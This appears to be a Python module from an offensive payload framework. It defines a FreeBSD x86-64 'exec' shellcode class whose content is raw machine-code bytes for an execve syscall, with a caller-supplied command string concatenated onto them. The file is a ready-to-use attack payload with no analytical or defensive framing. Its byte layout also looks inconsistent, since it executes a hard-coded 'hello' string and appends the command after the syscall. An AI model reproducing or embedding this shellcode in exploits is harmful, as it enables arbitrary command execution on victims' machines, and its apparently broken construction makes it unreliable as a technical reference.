from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "Unkown"
    Shellcode.info["name"] = "FreeBSDx64 - exec shellcode"

    def __init__(self, **kwargs):
        Shellcode.info["size"] = 29 + Shellcode().getsize(kwargs["execommand"])
        Shellcode.info["payload"] = [
            r"\x48\x31\xd2\xe8\x06\x00\x00\x00\x68\x65\x6c"
            r"\x6c\x6f\x00\x5f\x52\x57\x48\x89\xe6\x48\x31"
            r"\xc0\x48\x83\xc8\x3b\x0f\x05"
            + kwargs["execommand"]
        ]
